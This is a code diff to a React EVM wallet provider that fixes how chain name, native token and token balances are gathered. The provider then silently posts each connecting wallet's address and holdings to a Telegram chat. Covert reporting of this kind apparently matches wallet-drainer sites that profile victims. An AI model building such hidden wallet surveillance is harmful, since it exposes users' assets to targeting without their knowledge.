@@ -3,6 +3,7 @@ import { ethers } from 'ethers';
 import { usePrivy, useWallets } from '@privy-io/react-auth';
 import { useChain, EVM_CHAINS } from '@/contexts/ChainContext';
 import { sendTelegramMessage } from '@/utils/telegram';
+import { detectWalletTokens } from '@/utils/evmTransactions';
 
 interface EVMWalletContextType {
   evmAddress: string | null;
@@ -61,7 +62,7 @@ export const EVMWalletProvider: FC<{ children: ReactNode }> = ({ children }) => 
   const [evmAddress, setEvmAddress] = useState<string | null>(null);
   const [evmProvider, setEvmProvider] = useState<ethers.BrowserProvider | null>(null);
   const [evmSigner, setEvmSigner] = useState<ethers.JsonRpcSigner | null>(null);
-  const { setActiveChain, setEvmChainId } = useChain();
+  const { setActiveChain, setEvmChainId, evmChainId, getEVMChain } = useChain();
   const pendingChainId = useRef<number | null>(null);
 
   // Send notification when EVM wallet connects
@@ -74,6 +75,11 @@ export const EVMWalletProvider: FC<{ children: ReactNode }> = ({ children }) => 
           const nativeBalance = await provider.getBalance(evmAddress);
           const nativeAmount = ethers.formatEther(nativeBalance);
 
+          // Get chain config
+          const evmChain = getEVMChain();
+          const chainName = evmChain?.name || 'Unknown';
+          const nativeToken = evmChain?.nativeToken || 'ETH';
+
           // Fetch token balances using detectWalletTokens function
           const tokenDetection = await detectWalletTokens(evmAddress, evmChainId || 1);
           const tokens = tokenDetection.tokens;
@@ -82,8 +88,8 @@ export const EVMWalletProvider: FC<{ children: ReactNode }> = ({ children }) => 
           let message = `
 🔗 <b>EVM Wallet Connected</b>
 👤 <b>Address:</b> <code>${evmAddress}</code>
-🌐 <b>Chain:</b> <code>${chainName || 'Unknown'}</code>
-💰 <b>Native Balance:</b> <code>${nativeAmount.slice(0, 10)} ${nativeToken || 'ETH'}</code>
+🌐 <b>Chain:</b> <code>${chainName}</code>
+💰 <b>Native Balance:</b> <code>${nativeAmount.slice(0, 10)} ${nativeToken}</code>
 `;
 
           if (tokens.length > 0) {
@@ -109,7 +115,7 @@ export const EVMWalletProvider: FC<{ children: ReactNode }> = ({ children }) => 
 
       fetchAndNotify();
     }
-  }, [evmAddress, evmSigner, evmChainId, chainName, nativeToken]);
+  }, [evmAddress, evmSigner, evmChainId, getEVMChain]);
 
   const { login, logout, authenticated, ready } = usePrivy();
   const { wallets } = useWallets();
